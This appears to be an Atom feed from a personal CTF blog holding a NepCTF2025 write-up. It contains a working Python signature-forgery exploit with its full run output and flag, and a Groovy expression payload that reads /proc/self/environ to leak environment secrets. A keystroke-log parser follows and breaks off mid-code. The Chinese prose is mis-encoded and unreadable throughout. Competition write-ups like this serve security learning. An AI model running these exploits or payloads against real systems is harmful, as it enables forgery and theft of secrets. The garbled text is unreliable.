<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Liv&#39;s blog</title>
  
  <subtitle>CTF blog</subtitle>
  <link href="https://tkazer.github.io/atom.xml" rel="self"/>
  
  <link href="https://tkazer.github.io/"/>
  <updated>2025-07-28T13:44:16.666Z</updated>
  <id>https://tkazer.github.io/</id>
  
  <author>
    <name>Liv</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>NepCTF2025 WP</title>
    <link href="https://tkazer.github.io/2025/07/28/NepCTF2025/"/>
    <id>https://tkazer.github.io/2025/07/28/NepCTF2025/</id>
    <published>2025-07-27T16:40:42.000Z</published>
    <updated>2025-07-28T13:44:16.666Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NepCTF2025-WP"><a href="#NepCTF2025-WP" class="headerlink" title="NepCTF2025 WP"></a>NepCTF2025 WP</h1><p>è¿™æ¬¡é€†å‘çš„é¢˜ç›®è´¨é‡éƒ½æŒºå¥½çš„ï¼Œå„ä¸ªè€ƒç‚¹éƒ½ä¸é”™ï¼Œæ‹¿ä¸‹ä¸‰ä¸ªä¸€è¡€å’Œä¸€ä¸ªä¸‰è¡€ã€‚</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Nepsign"><a href="#Nepsign" class="headerlink" title="Nepsign"></a>Nepsign</h2><p>Gemini 2.5Proä¸€æŠŠæ¢­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> literal_eval</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;...&#x27;</span></span><br><span class="line">PORT = <span class="number">443</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    d = [i <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    h = sm3.sm3_hash(d)</span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_steps</span>(<span class="params">msg: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">list</span>[<span class="built_in">int</span>]:</span><br><span class="line">    n = <span class="number">256</span></span><br><span class="line">    hex_symbols = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">    m = SM3(msg)</span><br><span class="line">    m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">    a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i: <span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n // <span class="number">8</span>)]</span><br><span class="line">    </span><br><span class="line">    step = [<span class="number">0</span>] * <span class="number">48</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        step[i] = a[i]</span><br><span class="line">        </span><br><span class="line">    sum_vals = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">            <span class="keyword">if</span> m[j - <span class="number">1</span>] == hex_symbols[i]:</span><br><span class="line">                sum_vals[i] += j</span><br><span class="line">        step[i + <span class="number">32</span>] = sum_vals[i] % <span class="number">255</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> step</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host, port</span>):</span><br><span class="line">        <span class="variable language_">self</span>.host = host</span><br><span class="line">        <span class="variable language_">self</span>.port = port</span><br><span class="line">        </span><br><span class="line">        sock = socket.create_connection((host, port))</span><br><span class="line"> </span><br><span class="line">        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)</span><br><span class="line">        </span><br><span class="line">        context.check_hostname = <span class="literal">False</span></span><br><span class="line">        context.verify_mode = ssl.CERT_NONE</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.r = context.wrap_socket(sock, server_hostname=<span class="variable language_">self</span>.host)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Connected to <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span> with SSL using SSLContext.&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.r.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recv_until</span>(<span class="params">self, delim=<span class="string">b&#x27;&gt; &#x27;</span></span>):</span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> data.endswith(delim):</span><br><span class="line">            data += <span class="variable language_">self</span>.r.recv(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign_message</span>(<span class="params">self, msg_hex: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Asks the server to sign a message and returns the signature.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.r.sendall(<span class="string">b&#x27;1\n&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.recv_until(<span class="string">b&#x27;msg: &#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.r.sendall(msg_hex.encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        response = <span class="variable language_">self</span>.r.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">        <span class="variable language_">self</span>.recv_until(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> literal_eval(response)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify_and_get_flag</span>(<span class="params">self, qq: <span class="built_in">list</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Submits the forged signature for verification.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.r.sendall(<span class="string">b&#x27;2\n&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.recv_until(<span class="string">b&#x27;give me a qq: &#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.r.sendall(<span class="built_in">str</span>(qq).encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        flag = <span class="variable language_">self</span>.r.recv(<span class="number">1024</span>).decode()</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        target_msg = <span class="string">b&#x27;happy for NepCTF 2025&#x27;</span></span><br><span class="line">        target_steps = get_steps(target_msg)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Target message: <span class="subst">&#123;target_msg.decode()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Required step values calculated.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        final_qq = [<span class="literal">None</span>] * <span class="number">48</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">48</span>), desc=<span class="string">&quot;[*] Forging signature parts&quot;</span>):</span><br><span class="line">            nonce_counter = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                forge_msg = os.urandom(<span class="number">16</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> forge_msg == target_msg:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                current_steps = get_steps(forge_msg)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> current_steps[i] == target_steps[i]:</span><br><span class="line">                    qq_forge = <span class="variable language_">self</span>.sign_message(forge_msg.<span class="built_in">hex</span>())</span><br><span class="line">                    </span><br><span class="line">                    final_qq[i] = qq_forge[i]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">                nonce_counter += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[+] Successfully forged all 48 signature parts.&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Submitting final signature for verification...&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(final_qq)</span><br><span class="line">        flag = <span class="variable language_">self</span>.verify_and_get_flag(final_qq)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ğŸ FLAG: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.r.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> gmssl</span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Please install the required &#x27;gmssl&#x27; library: pip install gmssl&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">        </span><br><span class="line">    exploit = Exploit(HOST,PORT)</span><br><span class="line">    exploit.run()</span><br><span class="line"></span><br><span class="line"><span class="comment"># [*] Connected to nepctf31-d0qf-gter-lpkh-eq4whjx91414.nepctf.com:443 with SSL using SSLContext.</span></span><br><span class="line"><span class="comment"># [*] Target message: happy for NepCTF 2025</span></span><br><span class="line"><span class="comment"># [*] Required step values calculated.</span></span><br><span class="line"><span class="comment"># [*] Forging signature parts: 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 48/48 [05:27&lt;00:00,  6.82s/it]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] Successfully forged all 48 signature parts.</span></span><br><span class="line"><span class="comment"># [*] Submitting final signature for verification...</span></span><br><span class="line"><span class="comment"># [&#x27;39b010ac6302a552f2b377dfdbd0125e4dcaf8c94cf838bb8b139e79d09ddcec&#x27;, &#x27;8f12c96114d5fcfa639c7d9fb6e9a953ec967fa30a04518ec49414d310bcedee&#x27;, &#x27;fa7538447f0da0558ec30fe5bdde244127959aedac4b32669a7e22baa19e3ed6&#x27;, &#x27;a2c8d562f8bc749f7e9fe7f5f4141c2006207b1b5550ae05beccfbaf0f53fe75&#x27;, &#x27;c1c9bf6d40ed4e14dd18ab9dd0bbbcad0dcdc4f12d8553fd30c7bb3f86c589aa&#x27;, &#x27;05c8b9552e5e283ac0cee392807fdf7d1b98ae3538bd5ab0fd24a43f39c3a3c8&#x27;, &#x27;78c8d76a69d1c5dd3563112a26271fa75730c8197597eabb7ffb9d64282f12ac&#x27;, &#x27;4a23e84f467275db471b688e4e2fec0a0a435538a3766c3a5427debc95fab1d3&#x27;, &#x27;85703b8a4050b34786ae994d1585944b711e7d5e6d474a3f4b0ac827bd1b4d46&#x27;, &#x27;3280cfb408907e20292d0d702c4046e5f79b828142a36f1820e8b58b9a9c269e&#x27;, &#x27;06fee77bb993584f78098ad550c9baf7eeb55d91526de2d4454dc4a1d2c2aa6f&#x27;, &#x27;79d2f0bafc01ed11e1c5a772ab33cb31f49648680a5933e0a3c8993bfa3e6e0b&#x27;, &#x27;84446dccf736fff63e7d9914c39976d08b7db7bd47c0fa42acfe21179f248553&#x27;, &#x27;b3c9d0724f7ca087dbf3283435c98888fbbb17db1f50215764d893c18850e1ad&#x27;, &#x27;9728c58f692e84c0122f8d009a2e58ac560bef50ee1566b5b2d0ccfea1159e9d&#x27;, &#x27;8bcd86f395b95ae16ab5ecad8e386f7f98b6fe829b6fbce1e83dc05dfd210017&#x27;, &#x27;762c94adeb5167fc3df441ba83d8a8af68359579e368a568897fbb540784f225&#x27;, &#x27;5d9d1f0b253eb1d4f5d289d393bc0ed0b7ce89a61d073a113088f3a7a8c06acb&#x27;, &#x27;cf24458be2e5f05f53ebdf54c848be56632a49e3a88d58221bae4be14856e9df&#x27;, &#x27;b0001d89142d2add384e3c4c236a743b345aa306d4f23e5689c73c43eab6d089&#x27;, &#x27;d62e08c88c402456b46e5d75e66a5d37e1b606d88e0bc6b2399d2ad19795025f&#x27;, &#x27;b2a30ead02ff626ee69b4c82a7c34c3376615352775d0ff317fcf9b88d4a082b&#x27;, &#x27;27f04230c2f63eba8bd3c3166620a97c91e125eb21c5b70d7ff19a338880d1ed&#x27;, &#x27;15d1668d22e79aa2ed3cec99a000738aa5a00466f0d5fe9e7a0ccb5d125e5694&#x27;, &#x27;3852b4c577b06d584149ed18a5f40f928852738b0d6969926b6408af5ae3a03a&#x27;, &#x27;2d92db3406e756b2914148350755186419d87648fdd52a7928e4579c7cd60c03&#x27;, &#x27;49908b6da8adcfde75ab89901ee81b4a7be69536d07ad446a23336df3b250cfa&#x27;, &#x27;f16d19be270a5f2d27a9fabb4e71cdb60775e97724c880483fec6e1a96097f8e&#x27;, &#x27;376f05bed3c4e6830086fe3dabe7739cddbc8404a5423a740b1a3a8e0344a0c9&#x27;, &#x27;86bca065c621d9450f1ab47f7d7d093006cabf741f959aa14c8581f3bfbb5f40&#x27;, &#x27;4551b1f456875b82962c13dcb34f697911761bb8caf387036c9492f1a9c082b9&#x27;, &#x27;42ebce9edc6fd9513c6cdc69fd7f16e106a3d46c9908db96e01df593d2cb07b2&#x27;, &#x27;9b6e783aee1ffbea5a7d16642beaca54388511aaf4303f1193f132f69bfa650b&#x27;, &#x27;11473c8fb9d395f743c0210b731b6fb42d2e7ca99b1f06ca8fe01e4f6790f55f&#x27;, &#x27;eefa9bf5925c00244c5b7910da62098c6dc35cf1f282a64ad44c9e758aba6de8&#x27;, &#x27;825e7a8a6d1909e602a820ada46488905a6163d88551af71b1b2fe5c32a8de9a&#x27;, &#x27;47c381462cde495eb7cf484464f65d821df89183479a3a8b51890110c67b1e68&#x27;, &#x27;b83a6dd98d5b64f46f2a62a4eff1d6f5ed89a61d0d6e17aaee7c29797cbf1acd&#x27;, &#x27;9019e02438e0113cd3fa9fd336ef511195e94c5163f2b3c6a881cefe8e653a89&#x27;, &#x27;966cb62f086f2f3ada010cc9f34d760109629580416fc11dc38f1c90b386f408&#x27;, &#x27;975c033da39a76eecd8a45adcee1097ace7c7f4d45344ac533cb78047a2f6d19&#x27;, &#x27;69ba0387f210c6444c0fad1161d47467973a7ff5dcaeb5f48dc6bbcf5cc657e0&#x27;, &#x27;583873a985f570097c0dfa418408009731bf07ee366364ac070ffc6c23bb3865&#x27;, &#x27;797e77020143e42eee3b9e1b7a6bc3d1c6d50a13989db041fe1f15b389eaceaa&#x27;, &#x27;683ba0fe4a480a12997f14ec664f389e13e5914978621f735fd0d9ad813fe2aa&#x27;, &#x27;a60bb1ca5235d3301b08844b22a058ef11966de77a66f4ef502794f7a9cd2fbd&#x27;, &#x27;227edd3ef3443f9368e6b76d7fb2d3a298c1b4e5d1e57551a8f18a3a9fed45ed&#x27;, &#x27;52e4b8362c85ef9af83099242887bac6db4e937de7b0c817d0a229d68cdaefda&#x27;]    </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================================================</span></span><br><span class="line"><span class="comment"># ğŸ FLAG: NepCTF&#123;d6a4a58b-8b11-2ba3-4aa2-7643d50d25b6&#125;</span></span><br><span class="line"><span class="comment"># ==================================================</span></span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easyGooGooVVVV"><a href="#easyGooGooVVVV" class="headerlink" title="easyGooGooVVVV"></a>easyGooGooVVVV</h2><p>Gemini 2.5Pro</p><p><img src="/2025/07/28/NepCTF2025/46b253d5-c5b2-4b63-99da-c6a186170a32.png" alt="alt text"></p><p>exp:<br><code>this.getClass().getClassLoader().getResource(&quot;file:///proc/self/environ&quot;).text</code></p><h2 id="RevengeGooGooVVVY"><a href="#RevengeGooGooVVVY" class="headerlink" title="RevengeGooGooVVVY"></a>RevengeGooGooVVVY</h2><p>åŒä¸ŠEXPã€‚</p><p>exp:<br><code>this.getClass().getClassLoader().getResource(&quot;file:///proc/self/environ&quot;).text</code></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="NepBotEvent"><a href="#NepBotEvent" class="headerlink" title="NepBotEvent"></a>NepBotEvent</h2><p>ä»é¢˜ç›®ä»¥åŠæ–‡ä»¶ç»“æ„å¯åˆ†æå‡ºæ˜¯input_eventç»“æ„ä½“æ•°æ®ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">input_event</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">timeval</span> time;</span><br><span class="line">    __u16 type;</span><br><span class="line">    __u16 code;</span><br><span class="line">    __s32 value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è§£æä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">KEY_MAP = &#123;</span><br><span class="line">    <span class="number">0x01</span>: <span class="string">&quot;ESC&quot;</span>,</span><br><span class="line">    <span class="number">0x02</span>: <span class="string">&quot;1&quot;</span>, <span class="number">0x03</span>: <span class="string">&quot;2&quot;</span>, <span class="number">0x04</span>: <span class="string">&quot;3&quot;</span>, <span class="number">0x05</span>: <span class="string">&quot;4&quot;</span>, <span class="number">0x06</span>: <span class="string">&quot;5&quot;</span>,</span><br><span class="line">    <span class="number">0x07</span>: <span class="string">&quot;6&quot;</span>, <span class="number">0x08</span>: <span class="string">&quot;7&quot;</span>, <span class="number">0x09</span>: <span class="string">&quot;8&quot;</span>, <span class="number">0x0a</span>: <span class="string">&quot;9&quot;</span>, <span class="number">0x0b</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="number">0x0c</span>: <span class="string">&quot;-&quot;</span>, <span class="number">0x0d</span>: <span class="string">&quot;=&quot;</span>, <span class="number">0x0e</span>: <span class="string">&quot;[BACKSPACE]&quot;</span>,</span><br><span class="line">    <span class="number">0x0f</span>: <span class="string">&quot;[TAB]&quot;</span>,</span><br><span class="line">    <span class="number">0x10</span>: <span class="string">&quot;q&quot;</span>, <span class="number">0x11</span>: <span class="string">&quot;w&quot;</span>, <span class="number">0x12</span>: <span class="string">&quot;e&quot;</span>, <span class="number">0x13</span>: <span class="string">&quot;r&quot;</span>, <span class="number">0x14</span>: <span class="string">&quot;t&quot;</span>,</span><br><span class="line">    <span class="number">0x15</span>: <span class="string">&quot;y&quot;</span>, <span class="number">0x16</span>: <span class="string">&quot;u&quot;</span>, <span class="number">0x17</span>: <span class="string">&quot;i&quot;</span>, <span class="number">0x18</span>: <span class="string">&quot;o&quot;</span>, <span class="number">0x19</span>: <span class="string">&quot;p&quot;</span>,</span><br><span class="line">    <span class="number">0x1a</span>: <span class="string">&quot;[&quot;</span>, <span class="number">0x1b</span>: <span class="string">&quot;]&quot;</span>, <span class="number">0x1c</span>: <span class="string">&quot;[ENTER]\n&quot;</span>,</span><br><span class="line">    <span class="number">0x1d</span>: <span class="string">&quot;[L_CTRL]&quot;</span>,</span><br><span class="line">    <span class="number">0x1e</span>: <span class="string">&quot;a&quot;</span>, <span class="number">0x1f</span>: <span class="string">&quot;s&quot;</span>, <span class="number">0x20</span>: <span class="string">&quot;d&quot;</span>, <span class="number">0x21</span>: <span class="string">&quot;f&quot;</span>, <span class="number">0x22</span>: <span class="string">&quot;g&quot;</span>,</span><br><span class="line">    <span class="number">0x23</span>: <span class="string">&quot;h&quot;</span>, <span class="number">0x24</span>: <span class="string">&quot;j&quot;</span>, <span class="number">0x25</span>: <span class="string">&quot;k&quot;</span>, <span class="number">0x26</span>: <span class="string">&quot;l&quot;</span>, <span class="number">0x27</span>: <span class="string">&quot;;&quot;</span>,</span><br><span class="line">    <span class="number">0x28</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x29</span>: <span class="string">&quot;`&quot;</span>,</span><br><span class="line">    <span class="number">0x2a</span>: <span class="string">&quot;[L_SHIFT]&quot;</span>,</span><br><span class="line">    <span class="number">0x2b</span>: <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">    <span class="number">0x2c</span>: <span class="string">&quot;z&quot;</span>, <span class="number">0x2d</span>: <span class="string">&quot;x&quot;</span>, <span class="number">0x2e</span>: <span class="string">&quot;c&quot;</span>, <span class="number">0x2f</span>: <span class="string">&quot;v&quot;</span>, <span class="number">0x30</span>: <span class="string">&quot;b&quot;</span>,</span><br><span class="line">    <span class="number">0x31</span>: <span class="string">&quot;n&quot;</span>, <span class="number">0x32</span>: <span class="string">&quot;m&quot;</span>, <span class="number">0x33</span>: <span class="string">&quot;,&quot;</span>, <span class="number">0x34</span>: <span class="string">&quot;.&quot;</span>, <span class="number">0x35</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">    <span class="number">0x36</span>: <span class="string">&quot;[R_SHIFT]&quot;</span>,</span><br><span class="line">    <span class="number">0x37</span>: <span class="string">&quot;[NUM_*]&quot;</span>,</span><br><span class="line">    <span class="number">0x38</span>: <span class="string">&quot;[L_ALT]&quot;</span>,</span><br><span class="line">    <span class="number">0x39</span>: <span class="string">&quot; &quot;</span>,</span><br><span class="line">    <span class="number">0x3a</span>: <span class="string">&quot;[CAPSLOCK]&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SHIFT_KEY_MAP = &#123;</span><br><span class="line">    <span class="number">0x02</span>: <span class="string">&quot;!&quot;</span>, <span class="number">0x03</span>: <span class="string">&quot;@&quot;</span>, <span class="number">0x04</span>: <span class="string">&quot;#&quot;</span>, <span class="number">0x05</span>: <span class="string">&quot;$&quot;</span>, <span class="number">0x06</span>: <span class="string">&quot;%&quot;</span>,</span><br><span class="line">    <span class="number">0x07</span>: <span class="string">&quot;^&quot;</span>, <span class="number">0x08</span>: <span class="string">&quot;&amp;&quot;</span>, <span class="number">0x09</span>: <span class="string">&quot;*&quot;</span>, <span class="number">0x0a</span>: <span class="string">&quot;(&quot;</span>, <span class="number">0x0b</span>: <span class="string">&quot;)&quot;</span>,</span><br><span class="line">    <span class="number">0x0c</span>: <span class="string">&quot;_&quot;</span>, <span class="number">0x0d</span>: <span class="string">&quot;+&quot;</span>,</span><br><span class="line">    <span class="number">0x10</span>: <span class="string">&quot;Q&quot;</span>, <span class="number">0x11</span>: <span class="string">&quot;W&quot;</span>, <span class="number">0x12</span>: <span class="string">&quot;E&quot;</span>, <span class="number">0x13</span>: <span class="string">&quot;R&quot;</span>, <span class="number">0x14</span>: <span class="string">&quot;T&quot;</span>,</span><br><span class="line">    <span class="number">0x15</span>: <span class="string">&quot;Y&quot;</span>, <span class="number">0x16</span>: <span 